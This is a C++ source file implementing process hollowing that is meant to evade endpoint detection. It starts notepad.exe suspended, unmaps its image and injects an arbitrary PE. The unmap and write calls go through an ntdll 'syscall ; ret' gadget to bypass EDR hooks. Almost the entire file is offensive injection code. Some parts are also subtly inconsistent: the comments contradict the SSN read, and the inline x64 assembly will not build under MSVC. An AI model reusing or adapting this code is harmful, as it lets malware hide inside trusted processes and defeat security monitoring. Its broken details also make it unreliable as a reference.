/*
 * Process Hollowing — Indirect Syscall Variant
 *
 * Replaces the two direct ntdll call-sites in the classic Process Hollowing
 * chain (NtUnmapViewOfSection and NtWriteVirtualMemory) with indirect syscall
 * stubs that:
 *   1. Scan ntdll's .text section at runtime for a "syscall ; ret" gadget
 *      (bytes 0x0F 0x05 0xC3) to use as the actual syscall dispatcher.
 *   2. Read each function's System Service Number (SSN) from its clean ntdll
 *      prologue at offset +4 (the "mov eax, <SSN>" immediate).
 *   3. Execute the syscall via the gadget rather than the stub's own syscall
 *      instruction, defeating EDR hooks that overwrite the first bytes of each
 *      ntdll export.
 *
 * All other hollowing logic (CreateProcess suspended, GetThreadContext,
 * ReadProcessMemory PEB, VirtualAllocEx, section write, relocation fixup,
 * SetThreadContext, ResumeThread) is identical to the original implementation
 * in Process_Hollowing/ProcessHollowing/Source.cpp.
 */

#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <winternl.h>
#include <iostream>

// ---------------------------------------------------------------------------
// Relocation structures (same as original Header.h)
// ---------------------------------------------------------------------------

typedef NTSTATUS(WINAPI* _NtUnmapViewOfSectionFunc)(HANDLE ProcessHandle, PVOID BaseAddress);

typedef struct RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} RELOCATION_BLOCK, * PRELOCATION_BLOCK;

typedef struct RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type   : 4;
} RELOCATION_ENTRY, * PRELOCATION_ENTRY;

// ---------------------------------------------------------------------------
// Indirect syscall infrastructure
// ---------------------------------------------------------------------------

// Global gadget address: the "syscall ; ret" bytes found in ntdll .text.
static UINT_PTR g_SyscallGadget = 0;

/*
 * FindSyscallGadget
 *
 * Walks the .text section of the ntdll image that is already mapped into this
 * process.  Searches for the three-byte sequence { 0x0F, 0x05, 0xC3 } which
 * encodes "syscall ; ret".  Returns the address of the first occurrence, or
 * NULL on failure.
 */
static UINT_PTR FindSyscallGadget(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    // Walk the PE header to locate the .text section.
    BYTE* base = reinterpret_cast<BYTE*>(hNtdll);
    PIMAGE_DOS_HEADER dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
    PIMAGE_NT_HEADERS nt  = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        // Match ".text" (8-byte field, may not be null-terminated at position 5+)
        if (memcmp(sec->Name, ".text", 5) == 0) {
            BYTE* start = base + sec->VirtualAddress;
            SIZE_T  len   = sec->Misc.VirtualSize;

            for (SIZE_T j = 0; j + 2 < len; j++) {
                if (start[j]   == 0x0F &&
                    start[j+1] == 0x05 &&
                    start[j+2] == 0xC3) {
                    return reinterpret_cast<UINT_PTR>(start + j);
                }
            }
        }
    }
    return 0;
}

/*
 * ResolveSSN
 *
 * Reads the System Service Number baked into the ntdll stub for the named
 * function.  The x64 syscall stub layout is:
 *
 *   +0  4C 8B D1          mov r10, rcx
 *   +3  B8 xx 00 00 00    mov eax, <SSN>   ← byte at offset +4 is the SSN
 *   +8  ...
 *
 * This reads only the low byte of the immediate, which is sufficient for all
 * Windows NT syscall numbers below 256.  For numbers 256-511 the second byte
 * (offset +5) must also be read; those are not used here.
 */
static DWORD ResolveSSN(const char* funcName) {
    UINT_PTR addr = reinterpret_cast<UINT_PTR>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), funcName));
    if (!addr) return 0;
    // Read the 16-bit SSN at offset +4 to handle numbers up to 0x1FF.
    return static_cast<DWORD>(*reinterpret_cast<USHORT*>(addr + 4));
}

/*
 * IndirectSyscall2 / IndirectSyscall5
 *
 * Minimal inline-assembly stubs that load rax with the SSN, shuffle the
 * arguments into the correct registers per the Windows x64 syscall ABI, then
 * jump (not call) to g_SyscallGadget so the CPU executes "syscall ; ret" from
 * within ntdll — bypassing any EDR hook on the export stub itself.
 *
 * Windows syscall argument order: rcx, rdx, r8, r9, [rsp+0x28], [rsp+0x30] …
 * The Microsoft x64 calling convention already places the first four arguments
 * in rcx/rdx/r8/r9, so we only need to preserve them and set rax.
 *
 * NtUnmapViewOfSection(HANDLE, PVOID)  — 2 user arguments
 * NtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PULONG) — 5 user args
 *
 * NOTE: These stubs must be compiled as x64; they will not assemble on x86.
 */

#if defined(_WIN64)

__declspec(noinline)
static NTSTATUS IndirectNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
    DWORD ssn = ResolveSSN("NtUnmapViewOfSection");
    UINT_PTR gadget = g_SyscallGadget;
    NTSTATUS status = STATUS_SUCCESS;
    __asm {
        ; Save non-volatile registers we clobber — none beyond what the ABI requires.
        ; Arguments already in rcx, rdx per x64 ABI.
        mov  r10, rcx          ; Windows syscall ABI: r10 = rcx (first arg)
        mov  eax, [ssn]        ; SSN
        jmp  qword ptr [gadget] ; tail-jump into "syscall ; ret" gadget
    }
    // Unreachable: the jmp above transfers control and "ret" in the gadget
    // returns directly to our caller.  MSVC requires a return statement though.
    return status;
}

__declspec(noinline)
static NTSTATUS IndirectNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PULONG  NumberOfBytesWritten)
{
    DWORD ssn = ResolveSSN("NtWriteVirtualMemory");
    UINT_PTR gadget = g_SyscallGadget;
    NTSTATUS status = STATUS_SUCCESS;
    __asm {
        mov  r10, rcx
        mov  eax, [ssn]
        jmp  qword ptr [gadget]
    }
    return status;
}

#else
#error "ProcessHollowing_IndirectSyscall requires an x64 build (_WIN64)."
#endif // _WIN64

// ---------------------------------------------------------------------------
// Main hollowing routine (identical to original except for the two Nt calls)
// ---------------------------------------------------------------------------

int main(int argc, char* argv[]) {

    if (argc != 2) {
        printf("Usage: ProcessHollowing_IndirectSyscall.exe <PE binary to inject>\n");
        return 0;
    }

    // Locate a "syscall ; ret" gadget in ntdll once at startup.
    g_SyscallGadget = FindSyscallGadget();
    if (!g_SyscallGadget) {
        fprintf(stderr, "[-] Failed to locate syscall;ret gadget in ntdll .text\n");
        return 1;
    }
    printf("[+] Syscall gadget found at 0x%p\n", reinterpret_cast<void*>(g_SyscallGadget));

    // Verify the two SSNs resolved before doing anything destructive.
    DWORD ssnUnmap  = ResolveSSN("NtUnmapViewOfSection");
    DWORD ssnWrite  = ResolveSSN("NtWriteVirtualMemory");
    if (!ssnUnmap || !ssnWrite) {
        fprintf(stderr, "[-] Failed to resolve SSN for one or more NT functions\n");
        return 1;
    }
    printf("[+] NtUnmapViewOfSection SSN = 0x%02X\n", ssnUnmap);
    printf("[+] NtWriteVirtualMemory SSN = 0x%02X\n", ssnWrite);

    // -----------------------------------------------------------------------
    // Create notepad.exe as a suspended process.
    // -----------------------------------------------------------------------
    LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
    PROCESS_INFORMATION procInfo;
    memset(startupInfo, 0, sizeof(STARTUPINFOA));
    startupInfo->cb = sizeof(STARTUPINFOA);

    printf("[+] Creating Notepad.exe as Suspended Process.\n");
    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
            NULL, NULL, startupInfo, &procInfo)) {
        fprintf(stderr, "[-] CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }

    // -----------------------------------------------------------------------
    // Get all register values from the suspended thread.
    // -----------------------------------------------------------------------
    printf("[+] Getting Current Context.\n");
    LPCONTEXT threadContext = new CONTEXT();
    threadContext->ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(procInfo.hThread, threadContext)) {
        printf("[-] Error getting context\n");
        return 0;
    }

    // -----------------------------------------------------------------------
    // Get the base address of the suspended process from the PEB.
    // -----------------------------------------------------------------------
    PVOID baseAddress;
#ifdef _X86_
    ReadProcessMemory(procInfo.hProcess,
        reinterpret_cast<PVOID>(threadContext->Ebx + 8),
        &baseAddress, sizeof(PVOID), NULL);
#endif
#ifdef _WIN64
    ReadProcessMemory(procInfo.hProcess,
        reinterpret_cast<PVOID>(threadContext->Rdx + sizeof(SIZE_T) * 2),
        &baseAddress, sizeof(PVOID), NULL);
#endif

    // -----------------------------------------------------------------------
    // Unmap the suspended process's image using an indirect NtUnmapViewOfSection.
    // -----------------------------------------------------------------------
    printf("[+] Unmapping the Memory Section of Target Process (indirect syscall).\n");
    NTSTATUS unmapStatus = IndirectNtUnmapViewOfSection(procInfo.hProcess, baseAddress);
    if (unmapStatus) {
        printf("[-] NtUnmapViewOfSection failed: 0x%08X\n", unmapStatus);
        return 0;
    }

    // -----------------------------------------------------------------------
    // Read the replacement PE file into memory.
    // -----------------------------------------------------------------------
    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open PE file." << std::endl;
        return 1;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        std::cerr << "Failed to get file size" << std::endl;
        CloseHandle(hFile);
        return 1;
    }
    char* PEBytes = reinterpret_cast<char*>(malloc(fileSize));
    if (!PEBytes) {
        std::cerr << "Failed to allocate memory" << std::endl;
        CloseHandle(hFile);
        return 1;
    }
    DWORD bytesRead;
    if (!ReadFile(hFile, PEBytes, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        std::cerr << "Failed to read file into memory" << std::endl;
        free(PEBytes);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);

    // -----------------------------------------------------------------------
    // Parse DOS/NT headers from the replacement PE.
    // -----------------------------------------------------------------------
    PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(PEBytes);
    PIMAGE_NT_HEADERS ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<LPBYTE>(PEBytes) + dosHeader->e_lfanew);

    // -----------------------------------------------------------------------
    // Allocate memory in the suspended process for the new image.
    // -----------------------------------------------------------------------
    PVOID allocatedMemory = VirtualAllocEx(
        procInfo.hProcess, baseAddress,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

#ifdef _X86_
    DWORD baseOffset = reinterpret_cast<DWORD>(baseAddress)
                     - ntHeaders->OptionalHeader.ImageBase;
    printf("Original Process Base: 0x%p\nInject File Base: 0x%p\nOffset: 0x%p\n\n",
           ntHeaders->OptionalHeader.ImageBase, baseAddress, baseOffset);
    ntHeaders->OptionalHeader.ImageBase = reinterpret_cast<DWORD>(baseAddress);
#endif
#ifdef _WIN64
    DWORD64 baseOffset = reinterpret_cast<DWORD64>(baseAddress)
                       - ntHeaders->OptionalHeader.ImageBase;
    printf("[+] Original Process Base: 0x%p\n[+] Inject File Base: 0x%p\n\n",
           ntHeaders->OptionalHeader.ImageBase, baseAddress);
    ntHeaders->OptionalHeader.ImageBase = reinterpret_cast<DWORD64>(baseAddress);
#endif

    // Write PE headers into the allocated region.
    if (!WriteProcessMemory(procInfo.hProcess, baseAddress,
                            PEBytes, ntHeaders->OptionalHeader.SizeOfHeaders, 0)) {
        printf("Failed to write Headers\n");
        return 0;
    }

    // Write each section using an indirect NtWriteVirtualMemory call.
    PIMAGE_SECTION_HEADER sectionHeader;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        sectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(
            reinterpret_cast<LPBYTE>(PEBytes)
            + dosHeader->e_lfanew
            + sizeof(IMAGE_NT_HEADERS)
            + i * sizeof(IMAGE_SECTION_HEADER));

        printf("0x%p -- Writing Section: %s (indirect syscall)\n",
               reinterpret_cast<LPBYTE>(allocatedMemory) + sectionHeader->VirtualAddress,
               sectionHeader->Name);

        PVOID dest = reinterpret_cast<PVOID>(
            reinterpret_cast<LPBYTE>(allocatedMemory) + sectionHeader->VirtualAddress);
        PVOID src  = reinterpret_cast<PVOID>(
            reinterpret_cast<LPBYTE>(PEBytes) + sectionHeader->PointerToRawData);
        SIZE_T secSize = sectionHeader->SizeOfRawData;
        ULONG written  = 0;

        NTSTATUS writeStatus = IndirectNtWriteVirtualMemory(
            procInfo.hProcess, dest, src, secSize, &written);
        if (writeStatus) {
            printf("Error writing section %s: 0x%08X\n",
                   sectionHeader->Name, writeStatus);
        }
    }

    // -----------------------------------------------------------------------
    // Apply base relocations if the image loaded at a different address.
    // -----------------------------------------------------------------------
    if (baseOffset) {
        printf("\nRelocating The Relocation Table...\n");

        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            sectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(
                reinterpret_cast<LPBYTE>(PEBytes)
                + dosHeader->e_lfanew
                + sizeof(IMAGE_NT_HEADERS)
                + i * sizeof(IMAGE_SECTION_HEADER));

            char relocSectionName[] = ".reloc";
            if (memcmp(sectionHeader->Name, relocSectionName,
                       strlen(relocSectionName)) != 0) {
                continue;
            }

            DWORD relocAddress = sectionHeader->PointerToRawData;
            IMAGE_DATA_DIRECTORY relocData =
                ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            DWORD offset = 0;

            while (offset < relocData.Size) {
                PRELOCATION_BLOCK blockHeader =
                    reinterpret_cast<PRELOCATION_BLOCK>(&PEBytes[relocAddress + offset]);
                printf("\nRelocation Block 0x%p. Size: 0x%p\n",
                       blockHeader->PageAddress, blockHeader->BlockSize);

                offset += sizeof(RELOCATION_BLOCK);
                DWORD entryCount = (blockHeader->BlockSize - sizeof(RELOCATION_BLOCK))
                                   / sizeof(RELOCATION_ENTRY);
                printf("%d Entries Must Be Relocated In The Current Block.\n", entryCount);

                PRELOCATION_ENTRY blockEntries =
                    reinterpret_cast<PRELOCATION_ENTRY>(&PEBytes[relocAddress + offset]);

                for (int x = 0; x < static_cast<int>(entryCount); x++) {
                    offset += sizeof(RELOCATION_ENTRY);

                    if (blockEntries[x].Type == 0) {
                        printf("The Type Of Base Relocation Is 0. Skipping.\n");
                        continue;
                    }

                    DWORD fieldAddress = blockHeader->PageAddress + blockEntries[x].Offset;

#ifdef _X86_
                    DWORD entryAddr = 0;
                    ReadProcessMemory(procInfo.hProcess,
                        reinterpret_cast<PVOID>(reinterpret_cast<DWORD>(baseAddress) + fieldAddress),
                        &entryAddr, sizeof(PVOID), 0);
                    printf("0x%p --> 0x%p | At:0x%p\n",
                           entryAddr, entryAddr + baseOffset,
                           reinterpret_cast<PVOID>(reinterpret_cast<DWORD>(baseAddress) + fieldAddress));
                    entryAddr += baseOffset;
                    if (!WriteProcessMemory(procInfo.hProcess,
                            reinterpret_cast<PVOID>(reinterpret_cast<DWORD>(baseAddress) + fieldAddress),
                            &entryAddr, sizeof(PVOID), 0)) {
                        printf("Error Writing Entry.\n");
                    }
#endif
#ifdef _WIN64
                    DWORD64 entryAddr = 0;
                    ReadProcessMemory(procInfo.hProcess,
                        reinterpret_cast<PVOID>(reinterpret_cast<DWORD64>(baseAddress) + fieldAddress),
                        &entryAddr, sizeof(PVOID), 0);
                    printf("0x%p --> 0x%p | At:0x%p\n",
                           entryAddr, entryAddr + baseOffset,
                           reinterpret_cast<PVOID>(reinterpret_cast<DWORD64>(baseAddress) + fieldAddress));
                    entryAddr += baseOffset;
                    if (!WriteProcessMemory(procInfo.hProcess,
                            reinterpret_cast<PVOID>(reinterpret_cast<DWORD64>(baseAddress) + fieldAddress),
                            &entryAddr, sizeof(PVOID), 0)) {
                        printf("Error Writing Entry.\n");
                    }
#endif
                }
            }
        }
    }

    // -----------------------------------------------------------------------
    // Update the thread context to point at the new entry point, then resume.
    // -----------------------------------------------------------------------
#ifdef _X86_
    WriteProcessMemory(procInfo.hProcess,
        reinterpret_cast<PVOID>(threadContext->Ebx + 8),
        &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
    DWORD entryPoint = reinterpret_cast<DWORD>(
        reinterpret_cast<LPBYTE>(allocatedMemory)
        + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    threadContext->Eax = entryPoint;
#endif
#ifdef _WIN64
    WriteProcessMemory(procInfo.hProcess,
        reinterpret_cast<PVOID>(threadContext->Rdx + sizeof(SIZE_T) * 2),
        &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
    DWORD64 entryPoint = reinterpret_cast<DWORD64>(
        reinterpret_cast<LPBYTE>(allocatedMemory)
        + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    threadContext->Rcx = entryPoint;
#endif

    printf("\n[+] Setting the Thread Context.\n");
    if (!SetThreadContext(procInfo.hThread, threadContext)) {
        printf("Error setting context\n");
        return 0;
    }

    printf("[+] Resuming Thread.\n");
    if (!ResumeThread(procInfo.hThread)) {
        printf("[-] Error resuming thread\n");
        return 0;
    }

    printf("[+] Process Hollowing (Indirect Syscall) Technique Done\n");
    free(PEBytes);
    return 0;
}
